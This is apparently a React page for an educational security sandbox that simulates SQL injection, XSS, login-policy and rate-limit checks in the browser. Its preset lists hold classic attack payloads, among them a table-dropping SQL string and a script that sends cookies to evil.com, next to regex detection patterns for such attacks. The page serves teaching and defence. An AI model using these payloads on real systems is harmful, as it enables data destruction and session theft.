"use client"

import { useState } from "react"
import Link from "next/link"
import {
  ArrowLeft,
  Shield,
  Database,
  Code,
  Lock,
  Gauge,
  Play,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Terminal,
  Info,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"

// ---------- SQL Injection Sandbox ----------
function SQLInjectionSandbox() {
  const [input, setInput] = useState("")
  const [result, setResult] = useState<{
    vulnerable: string
    safe: string
    detected: boolean
    explanation: string
    severity: string
  } | null>(null)

  const sqlPatterns = [
    { pattern: /('|")\s*(OR|AND)\s+('|"|\d)/i, name: "Boolean-based injection", severity: "HIGH" },
    { pattern: /UNION\s+(ALL\s+)?SELECT/i, name: "UNION-based injection", severity: "CRITICAL" },
    { pattern: /;\s*(DROP|DELETE|UPDATE|INSERT|ALTER)\s/i, name: "Stacked queries", severity: "CRITICAL" },
    { pattern: /'\s*--/i, name: "Comment-based injection", severity: "HIGH" },
    { pattern: /'\s*;\s*$/i, name: "Statement termination", severity: "MEDIUM" },
    { pattern: /SLEEP\s*\(\d+\)/i, name: "Time-based blind injection", severity: "HIGH" },
    { pattern: /BENCHMARK\s*\(/i, name: "Benchmark-based injection", severity: "HIGH" },
    { pattern: /1\s*=\s*1/i, name: "Tautology attack", severity: "MEDIUM" },
    { pattern: /LOAD_FILE|INTO\s+OUTFILE|INTO\s+DUMPFILE/i, name: "File operation injection", severity: "CRITICAL" },
    { pattern: /INFORMATION_SCHEMA/i, name: "Schema enumeration", severity: "HIGH" },
  ]

  const presets = [
    { label: "Tautology", value: "' OR '1'='1" },
    { label: "UNION SELECT", value: "' UNION SELECT username, password FROM users --" },
    { label: "Stacked Query", value: "'; DROP TABLE users; --" },
    { label: "Time-based Blind", value: "' OR SLEEP(5) --" },
    { label: "Comment Bypass", value: "admin'--" },
    { label: "Schema Enum", value: "' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES --" },
  ]

  const analyze = () => {
    if (!input.trim()) return

    const detected = sqlPatterns.filter((p) => p.pattern.test(input))
    const isInjection = detected.length > 0
    const maxSeverity = detected.reduce((max, d) => {
      const order = { LOW: 0, MEDIUM: 1, HIGH: 2, CRITICAL: 3 }
      return order[d.severity as keyof typeof order] > order[max as keyof typeof order] ? d.severity : max
    }, "LOW")

    setResult({
      vulnerable: `SELECT * FROM users WHERE username = '${input}' AND password = '***'`,
      safe: `SELECT * FROM users WHERE username = $1 AND password = $2  -- params: ['${input.replace(/'/g, "''")}', '***']`,
      detected: isInjection,
      explanation: isInjection
        ? `Detected ${detected.length} injection pattern(s): ${detected.map((d) => d.name).join(", ")}. This input would manipulate the SQL query structure in a vulnerable application.`
        : "No SQL injection patterns detected. This input appears safe for database queries.",
      severity: isInjection ? maxSeverity : "SAFE",
    })
  }

  return (
    <div className="space-y-6">
      <div className="bg-muted/30 border border-border rounded-lg p-4">
        <div className="flex items-start gap-3">
          <Info className="w-5 h-5 text-primary shrink-0 mt-0.5" />
          <div className="text-sm text-muted-foreground space-y-2">
            <p className="font-medium text-foreground">How SQL Injection Works</p>
            <p>SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker&apos;s hostile data can trick the interpreter into executing unintended commands or accessing unauthorized data.</p>
            <p className="text-xs font-mono">Reference: OWASP Top 10 - A03:2021 Injection</p>
          </div>
        </div>
      </div>

      <div className="space-y-3">
        <label className="text-sm font-medium text-foreground">Test Input (simulated username field)</label>
        <div className="flex gap-2">
          <input
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            placeholder="Enter a username or try an injection payload..."
            className="flex-1 bg-input border border-border rounded-lg px-4 py-2.5 text-sm text-foreground font-mono placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
          />
          <Button onClick={analyze} className="gap-2 bg-primary text-primary-foreground hover:bg-primary/90">
            <Play className="w-4 h-4" />
            Analyze
          </Button>
        </div>
        <div className="flex flex-wrap gap-2">
          <span className="text-xs text-muted-foreground">Quick tests:</span>
          {presets.map((p) => (
            <button
              key={p.label}
              type="button"
              onClick={() => setInput(p.value)}
              className="px-2.5 py-1 text-xs font-mono bg-muted hover:bg-muted/80 text-muted-foreground hover:text-foreground rounded border border-border transition-colors"
            >
              {p.label}
            </button>
          ))}
        </div>
      </div>

      {result && (
        <div className="space-y-4">
          <div className={`border rounded-lg p-4 ${result.detected ? "border-red-500/30 bg-red-500/5" : "border-primary/30 bg-primary/5"}`}>
            <div className="flex items-center gap-2 mb-2">
              {result.detected ? (
                <XCircle className="w-5 h-5 text-red-500" />
              ) : (
                <CheckCircle2 className="w-5 h-5 text-primary" />
              )}
              <span className={`text-sm font-semibold ${result.detected ? "text-red-400" : "text-primary"}`}>
                {result.detected ? `INJECTION DETECTED - ${result.severity}` : "INPUT SAFE"}
              </span>
            </div>
            <p className="text-sm text-muted-foreground">{result.explanation}</p>
          </div>

          <div className="space-y-3">
            <div>
              <p className="text-xs text-red-400 font-mono mb-1.5 flex items-center gap-1">
                <XCircle className="w-3 h-3" /> VULNERABLE QUERY (string concatenation)
              </p>
              <pre className="bg-muted/50 border border-border rounded-lg p-3 text-xs font-mono text-foreground overflow-x-auto">
                {result.vulnerable}
              </pre>
            </div>
            <div>
              <p className="text-xs text-primary font-mono mb-1.5 flex items-center gap-1">
                <CheckCircle2 className="w-3 h-3" /> SAFE QUERY (parameterized)
              </p>
              <pre className="bg-muted/50 border border-border rounded-lg p-3 text-xs font-mono text-foreground overflow-x-auto">
                {result.safe}
              </pre>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

// ---------- XSS Testing Sandbox ----------
function XSSSandbox() {
  const [input, setInput] = useState("")
  const [result, setResult] = useState<{
    detected: boolean
    sanitized: string
    patterns: string[]
    severity: string
    explanation: string
  } | null>(null)

  const xssPatterns = [
    { pattern: /<script[\s>]/i, name: "Script tag injection", severity: "CRITICAL" },
    { pattern: /javascript\s*:/i, name: "JavaScript protocol", severity: "HIGH" },
    { pattern: /on\w+\s*=/i, name: "Event handler injection", severity: "HIGH" },
    { pattern: /<img[^>]+onerror/i, name: "Image error handler", severity: "HIGH" },
    { pattern: /<iframe/i, name: "Iframe injection", severity: "CRITICAL" },
    { pattern: /<svg[^>]+onload/i, name: "SVG onload injection", severity: "HIGH" },
    { pattern: /document\.(cookie|location|write)/i, name: "DOM manipulation", severity: "CRITICAL" },
    { pattern: /eval\s*\(/i, name: "Eval execution", severity: "CRITICAL" },
    { pattern: /expression\s*\(/i, name: "CSS expression", severity: "MEDIUM" },
    { pattern: /<\/?(?:body|head|html|meta|link|style)/i, name: "HTML structure injection", severity: "HIGH" },
  ]

  const presets = [
    { label: "Script Alert", value: '<script>alert("XSS")</script>' },
    { label: "IMG Onerror", value: '<img src=x onerror="alert(1)">' },
    { label: "Event Handler", value: '<div onmouseover="alert(document.cookie)">' },
    { label: "JS Protocol", value: '<a href="javascript:alert(1)">click</a>' },
    { label: "SVG Onload", value: '<svg onload="alert(1)">' },
    { label: "Cookie Steal", value: '<script>document.location="http://evil.com/?c="+document.cookie</script>' },
  ]

  const sanitize = (str: string): string => {
    return str
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#x27;")
      .replace(/\//g, "&#x2F;")
  }

  const analyze = () => {
    if (!input.trim()) return

    const detected = xssPatterns.filter((p) => p.pattern.test(input))
    const isXSS = detected.length > 0
    const maxSeverity = detected.reduce((max, d) => {
      const order = { LOW: 0, MEDIUM: 1, HIGH: 2, CRITICAL: 3 }
      return order[d.severity as keyof typeof order] > order[max as keyof typeof order] ? d.severity : max
    }, "LOW")

    setResult({
      detected: isXSS,
      sanitized: sanitize(input),
      patterns: detected.map((d) => d.name),
      severity: isXSS ? maxSeverity : "SAFE",
      explanation: isXSS
        ? `Detected ${detected.length} XSS pattern(s). This payload would execute arbitrary JavaScript in a victim's browser if rendered unsanitized.`
        : "No XSS patterns detected. This input appears safe for HTML rendering.",
    })
  }

  return (
    <div className="space-y-6">
      <div className="bg-muted/30 border border-border rounded-lg p-4">
        <div className="flex items-start gap-3">
          <Info className="w-5 h-5 text-primary shrink-0 mt-0.5" />
          <div className="text-sm text-muted-foreground space-y-2">
            <p className="font-medium text-foreground">How Cross-Site Scripting (XSS) Works</p>
            <p>XSS attacks inject malicious scripts into web pages viewed by other users. The attacker can steal cookies, session tokens, or redirect users to malicious sites. Three types: Reflected, Stored, and DOM-based XSS.</p>
          </div>
        </div>
      </div>

      <div className="space-y-3">
        <label className="text-sm font-medium text-foreground">Test Input (simulated comment/input field)</label>
        <div className="flex gap-2">
          <input
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            placeholder="Enter text or try an XSS payload..."
            className="flex-1 bg-input border border-border rounded-lg px-4 py-2.5 text-sm text-foreground font-mono placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
          />
          <Button onClick={analyze} className="gap-2 bg-primary text-primary-foreground hover:bg-primary/90">
            <Play className="w-4 h-4" />
            Analyze
          </Button>
        </div>
        <div className="flex flex-wrap gap-2">
          <span className="text-xs text-muted-foreground">Quick tests:</span>
          {presets.map((p) => (
            <button
              key={p.label}
              type="button"
              onClick={() => setInput(p.value)}
              className="px-2.5 py-1 text-xs font-mono bg-muted hover:bg-muted/80 text-muted-foreground hover:text-foreground rounded border border-border transition-colors"
            >
              {p.label}
            </button>
          ))}
        </div>
      </div>

      {result && (
        <div className="space-y-4">
          <div className={`border rounded-lg p-4 ${result.detected ? "border-red-500/30 bg-red-500/5" : "border-primary/30 bg-primary/5"}`}>
            <div className="flex items-center gap-2 mb-2">
              {result.detected ? (
                <XCircle className="w-5 h-5 text-red-500" />
              ) : (
                <CheckCircle2 className="w-5 h-5 text-primary" />
              )}
              <span className={`text-sm font-semibold ${result.detected ? "text-red-400" : "text-primary"}`}>
                {result.detected ? `XSS DETECTED - ${result.severity}` : "INPUT SAFE"}
              </span>
            </div>
            <p className="text-sm text-muted-foreground">{result.explanation}</p>
            {result.patterns.length > 0 && (
              <div className="flex flex-wrap gap-1.5 mt-3">
                {result.patterns.map((p) => (
                  <span key={p} className="px-2 py-0.5 bg-red-500/10 text-red-400 rounded text-xs font-mono">{p}</span>
                ))}
              </div>
            )}
          </div>

          <div className="space-y-3">
            <div>
              <p className="text-xs text-red-400 font-mono mb-1.5">RAW (dangerous if rendered as HTML)</p>
              <pre className="bg-muted/50 border border-border rounded-lg p-3 text-xs font-mono text-foreground overflow-x-auto">
                {input}
              </pre>
            </div>
            <div>
              <p className="text-xs text-primary font-mono mb-1.5">SANITIZED OUTPUT (safe to render)</p>
              <pre className="bg-muted/50 border border-border rounded-lg p-3 text-xs font-mono text-foreground overflow-x-auto">
                {result.sanitized}
              </pre>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

// ---------- Authentication Testing Sandbox ----------
function AuthSandbox() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [attempts, setAttempts] = useState<Array<{ username: string; password: string; result: string; timestamp: string }>>([])
  const [lockout, setLockout] = useState(false)
  const [failCount, setFailCount] = useState(0)

  const weakPasswords = ["password", "123456", "admin", "qwerty", "letmein", "password123", "12345678", "abc123", "monkey", "master"]

  const testAuth = () => {
    if (lockout) return

    const issues: string[] = []
    const timestamp = new Date().toLocaleTimeString()

    // Check for SQL injection in credentials
    const sqlPattern = /('|")\s*(OR|AND)\s+|;\s*(DROP|DELETE)|--\s*$/i
    if (sqlPattern.test(username) || sqlPattern.test(password)) {
      issues.push("SQL injection attempt in credentials")
    }

    // Check weak password
    if (weakPasswords.includes(password.toLowerCase())) {
      issues.push("Weak/common password detected")
    }

    // Check password length
    if (password.length < 8 && password.length > 0) {
      issues.push("Password too short (min 8 chars)")
    }

    // Check password complexity
    if (password.length >= 8) {
      if (!/[A-Z]/.test(password)) issues.push("Missing uppercase letter")
      if (!/[a-z]/.test(password)) issues.push("Missing lowercase letter")
      if (!/[0-9]/.test(password)) issues.push("Missing number")
      if (!/[!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]/.test(password)) issues.push("Missing special character")
    }

    // Check for empty fields
    if (!username.trim()) issues.push("Empty username")
    if (!password.trim()) issues.push("Empty password")

    const newFailCount = issues.length > 0 ? failCount + 1 : 0

    const resultText = issues.length === 0
      ? "PASS - Credentials meet security requirements"
      : `FAIL - ${issues.join("; ")}`

    setAttempts((prev) => [{ username, password: "*".repeat(password.length), result: resultText, timestamp }, ...prev].slice(0, 10))
    setFailCount(newFailCount)

    if (newFailCount >= 5) {
      setLockout(true)
      setAttempts((prev) => [{ username: "SYSTEM", password: "---", result: "ACCOUNT LOCKED - Too many failed attempts (rate limit triggered)", timestamp }, ...prev])
      setTimeout(() => {
        setLockout(false)
        setFailCount(0)
        setAttempts((prev) => [{ username: "SYSTEM", password: "---", result: "LOCKOUT RELEASED - Account unlocked after cooldown", timestamp: new Date().toLocaleTimeString() }, ...prev])
      }, 10000)
    }
  }

  return (
    <div className="space-y-6">
      <div className="bg-muted/30 border border-border rounded-lg p-4">
        <div className="flex items-start gap-3">
          <Info className="w-5 h-5 text-primary shrink-0 mt-0.5" />
          <div className="text-sm text-muted-foreground space-y-2">
            <p className="font-medium text-foreground">Authentication Security Testing</p>
            <p>Test login forms for common vulnerabilities: weak passwords, credential injection, brute force protection, and account lockout policies. After 5 failed attempts, the account locks for 10 seconds demonstrating rate limiting.</p>
          </div>
        </div>
      </div>

      <div className="grid gap-4 md:grid-cols-2">
        <div className="space-y-3">
          <label className="text-sm font-medium text-foreground">Username</label>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Enter username..."
            className="w-full bg-input border border-border rounded-lg px-4 py-2.5 text-sm text-foreground font-mono placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
            disabled={lockout}
          />
        </div>
        <div className="space-y-3">
          <label className="text-sm font-medium text-foreground">Password</label>
          <input
            type="text"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter password..."
            className="w-full bg-input border border-border rounded-lg px-4 py-2.5 text-sm text-foreground font-mono placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
            disabled={lockout}
          />
        </div>
      </div>

      <div className="flex items-center gap-4">
        <Button onClick={testAuth} disabled={lockout} className="gap-2 bg-primary text-primary-foreground hover:bg-primary/90">
          <Play className="w-4 h-4" />
          Test Authentication
        </Button>
        {lockout && (
          <span className="text-sm text-red-400 font-mono flex items-center gap-2">
            <AlertTriangle className="w-4 h-4" />
            Account locked - cooldown in progress
          </span>
        )}
        <span className="text-xs text-muted-foreground font-mono ml-auto">
          Failed attempts: {failCount}/5
        </span>
      </div>

      {attempts.length > 0 && (
        <div className="bg-muted/20 border border-border rounded-lg overflow-hidden">
          <div className="p-3 border-b border-border">
            <h4 className="text-sm font-semibold text-foreground">Attempt Log</h4>
          </div>
          <div className="max-h-[300px] overflow-y-auto">
            {attempts.map((attempt, i) => (
              <div key={i} className="px-4 py-2.5 border-b border-border last:border-0 flex items-start gap-3 text-xs font-mono">
                <span className="text-muted-foreground shrink-0">{attempt.timestamp}</span>
                <span className="text-muted-foreground shrink-0 w-20">{attempt.username}</span>
                <span className={attempt.result.startsWith("PASS") ? "text-primary" : attempt.result.includes("LOCKED") ? "text-yellow-400" : "text-red-400"}>
                  {attempt.result}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}

// ---------- Rate Limiting Sandbox ----------
function RateLimitSandbox() {
  const [requests, setRequests] = useState<Array<{ id: number; time: string; status: "allowed" | "limited" | "blocked" }>>([])
  const [requestCount, setRequestCount] = useState(0)
  const [windowStart, setWindowStart] = useState<number>(Date.now())
  const [isBlocked, setIsBlocked] = useState(false)
  const maxRequests = 10
  const windowMs = 15000 // 15 seconds

  const sendRequest = () => {
    const now = Date.now()

    // Reset window if expired
    if (now - windowStart > windowMs) {
      setRequestCount(0)
      setWindowStart(now)
      setIsBlocked(false)
    }

    const newCount = requestCount + 1
    setRequestCount(newCount)

    let status: "allowed" | "limited" | "blocked"
    if (newCount > maxRequests) {
      status = "blocked"
      setIsBlocked(true)
    } else if (newCount > maxRequests - 3) {
      status = "limited"
    } else {
      status = "allowed"
    }

    setRequests((prev) => [
      {
        id: prev.length + 1,
        time: new Date().toLocaleTimeString(),
        status,
      },
      ...prev,
    ].slice(0, 30))
  }

  const sendBurst = () => {
    let count = 0
    const interval = setInterval(() => {
      if (count >= 15) {
        clearInterval(interval)
        return
      }
      sendRequest()
      count++
    }, 200)
  }

  const remaining = Math.max(0, maxRequests - requestCount)

  return (
    <div className="space-y-6">
      <div className="bg-muted/30 border border-border rounded-lg p-4">
        <div className="flex items-start gap-3">
          <Info className="w-5 h-5 text-primary shrink-0 mt-0.5" />
          <div className="text-sm text-muted-foreground space-y-2">
            <p className="font-medium text-foreground">Rate Limiting Demonstration</p>
            <p>Rate limiting protects APIs from abuse by restricting the number of requests a client can make within a time window. This sandbox allows {maxRequests} requests per {windowMs / 1000} second window. Try the burst mode to see what happens when limits are exceeded.</p>
          </div>
        </div>
      </div>

      <div className="grid gap-4 md:grid-cols-4">
        <div className="bg-card border border-border rounded-lg p-4 text-center">
          <p className="text-xs text-muted-foreground mb-1">Requests Made</p>
          <p className="text-2xl font-bold font-mono text-foreground">{requestCount}</p>
        </div>
        <div className="bg-card border border-border rounded-lg p-4 text-center">
          <p className="text-xs text-muted-foreground mb-1">Remaining</p>
          <p className={`text-2xl font-bold font-mono ${remaining > 3 ? "text-primary" : remaining > 0 ? "text-yellow-400" : "text-red-400"}`}>{remaining}</p>
        </div>
        <div className="bg-card border border-border rounded-lg p-4 text-center">
          <p className="text-xs text-muted-foreground mb-1">Window</p>
          <p className="text-2xl font-bold font-mono text-foreground">{windowMs / 1000}s</p>
        </div>
        <div className="bg-card border border-border rounded-lg p-4 text-center">
          <p className="text-xs text-muted-foreground mb-1">Status</p>
          <p className={`text-sm font-bold font-mono ${isBlocked ? "text-red-400" : "text-primary"}`}>
            {isBlocked ? "BLOCKED" : "ALLOWED"}
          </p>
        </div>
      </div>

      {/* Rate bar */}
      <div className="space-y-2">
        <div className="flex items-center justify-between text-xs text-muted-foreground">
          <span>Rate Usage</span>
          <span>{requestCount}/{maxRequests}</span>
        </div>
        <div className="h-3 bg-muted rounded-full overflow-hidden">
          <div
            className={`h-full rounded-full transition-all duration-300 ${
              requestCount <= maxRequests - 3 ? "bg-primary" : requestCount <= maxRequests ? "bg-yellow-500" : "bg-red-500"
            }`}
            style={{ width: `${Math.min(100, (requestCount / maxRequests) * 100)}%` }}
          />
        </div>
      </div>

      <div className="flex items-center gap-3">
        <Button onClick={sendRequest} className="gap-2 bg-primary text-primary-foreground hover:bg-primary/90">
          <Play className="w-4 h-4" />
          Send Request
        </Button>
        <Button onClick={sendBurst} variant="outline" className="gap-2 bg-transparent">
          <Gauge className="w-4 h-4" />
          Send Burst (15 rapid requests)
        </Button>
        <Button
          onClick={() => {
            setRequestCount(0)
            setWindowStart(Date.now())
            setIsBlocked(false)
            setRequests([])
          }}
          variant="outline"
          className="gap-2 bg-transparent"
        >
          Reset
        </Button>
      </div>

      {requests.length > 0 && (
        <div className="bg-muted/20 border border-border rounded-lg overflow-hidden">
          <div className="p-3 border-b border-border">
            <h4 className="text-sm font-semibold text-foreground">Request Log</h4>
          </div>
          <div className="max-h-[250px] overflow-y-auto">
            {requests.map((req) => (
              <div key={req.id} className="px-4 py-2 border-b border-border last:border-0 flex items-center gap-4 text-xs font-mono">
                <span className="text-muted-foreground">#{req.id}</span>
                <span className="text-muted-foreground">{req.time}</span>
                <span className={`px-2 py-0.5 rounded ${
                  req.status === "allowed" ? "bg-primary/10 text-primary" :
                  req.status === "limited" ? "bg-yellow-500/10 text-yellow-400" :
                  "bg-red-500/10 text-red-400"
                }`}>
                  {req.status === "allowed" ? "200 OK" : req.status === "limited" ? "200 OK (throttled)" : "429 TOO MANY REQUESTS"}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}

// ---------- Main Sandbox Page ----------
export default function SandboxPage() {
  return (
    <div className="min-h-screen bg-background cyber-grid">
      <header className="border-b border-border bg-card/80 backdrop-blur-sm sticky top-0 z-50">
        <div className="max-w-5xl mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Link href="/">
                <Button variant="ghost" size="sm" className="gap-2 text-muted-foreground hover:text-foreground">
                  <ArrowLeft className="w-4 h-4" />
                  Back
                </Button>
              </Link>
              <div className="h-6 w-px bg-border" />
              <div className="flex items-center gap-2">
                <Terminal className="w-5 h-5 text-primary" />
                <h1 className="text-lg font-semibold text-foreground">Security Sandbox</h1>
              </div>
            </div>
            <div className="flex items-center gap-2 text-xs font-mono text-muted-foreground px-3 py-1.5 bg-muted/50 rounded-lg">
              <Shield className="w-3.5 h-3.5 text-primary" />
              <span>SAFE ENVIRONMENT</span>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-5xl mx-auto px-6 py-8">
        <div className="text-center space-y-3 mb-10">
          <h2 className="text-3xl font-bold text-foreground text-balance">
            Interactive Security <span className="text-primary">Testing Lab</span>
          </h2>
          <p className="text-muted-foreground max-w-2xl mx-auto">
            Explore common web vulnerabilities in a safe, sandboxed environment. Test SQL injection payloads,
            XSS vectors, authentication flaws, and rate limiting behavior without any real-world risk.
          </p>
        </div>

        <Tabs defaultValue="sql" className="space-y-6">
          <TabsList className="grid grid-cols-4 w-full bg-muted/30 border border-border">
            <TabsTrigger value="sql" className="gap-2 data-[state=active]:bg-primary/10 data-[state=active]:text-primary">
              <Database className="w-4 h-4" />
              <span className="hidden sm:inline">SQL Injection</span>
              <span className="sm:hidden">SQLi</span>
            </TabsTrigger>
            <TabsTrigger value="xss" className="gap-2 data-[state=active]:bg-primary/10 data-[state=active]:text-primary">
              <Code className="w-4 h-4" />
              <span className="hidden sm:inline">XSS Testing</span>
              <span className="sm:hidden">XSS</span>
            </TabsTrigger>
            <TabsTrigger value="auth" className="gap-2 data-[state=active]:bg-primary/10 data-[state=active]:text-primary">
              <Lock className="w-4 h-4" />
              <span className="hidden sm:inline">Auth Testing</span>
              <span className="sm:hidden">Auth</span>
            </TabsTrigger>
            <TabsTrigger value="rate" className="gap-2 data-[state=active]:bg-primary/10 data-[state=active]:text-primary">
              <Gauge className="w-4 h-4" />
              <span className="hidden sm:inline">Rate Limiting</span>
              <span className="sm:hidden">Rate</span>
            </TabsTrigger>
          </TabsList>

          <TabsContent value="sql">
            <div className="bg-card border border-border rounded-xl p-6">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-red-500/10 rounded-lg">
                  <Database className="w-5 h-5 text-red-400" />
                </div>
                <div>
                  <h3 className="font-semibold text-foreground">SQL Injection Testing</h3>
                  <p className="text-xs text-muted-foreground">Test and understand SQL injection attack vectors</p>
                </div>
              </div>
              <SQLInjectionSandbox />
            </div>
          </TabsContent>

          <TabsContent value="xss">
            <div className="bg-card border border-border rounded-xl p-6">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-yellow-500/10 rounded-lg">
                  <Code className="w-5 h-5 text-yellow-400" />
                </div>
                <div>
                  <h3 className="font-semibold text-foreground">Cross-Site Scripting (XSS) Testing</h3>
                  <p className="text-xs text-muted-foreground">Test XSS payloads and see how sanitization works</p>
                </div>
              </div>
              <XSSSandbox />
            </div>
          </TabsContent>

          <TabsContent value="auth">
            <div className="bg-card border border-border rounded-xl p-6">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-primary/10 rounded-lg">
                  <Lock className="w-5 h-5 text-primary" />
                </div>
                <div>
                  <h3 className="font-semibold text-foreground">Authentication Security Testing</h3>
                  <p className="text-xs text-muted-foreground">Test login security, password policies, and lockout mechanisms</p>
                </div>
              </div>
              <AuthSandbox />
            </div>
          </TabsContent>

          <TabsContent value="rate">
            <div className="bg-card border border-border rounded-xl p-6">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-primary/10 rounded-lg">
                  <Gauge className="w-5 h-5 text-primary" />
                </div>
                <div>
                  <h3 className="font-semibold text-foreground">Rate Limiting Demonstration</h3>
                  <p className="text-xs text-muted-foreground">See how rate limiting protects against abuse</p>
                </div>
              </div>
              <RateLimitSandbox />
            </div>
          </TabsContent>
        </Tabs>
      </main>
    </div>
  )
}
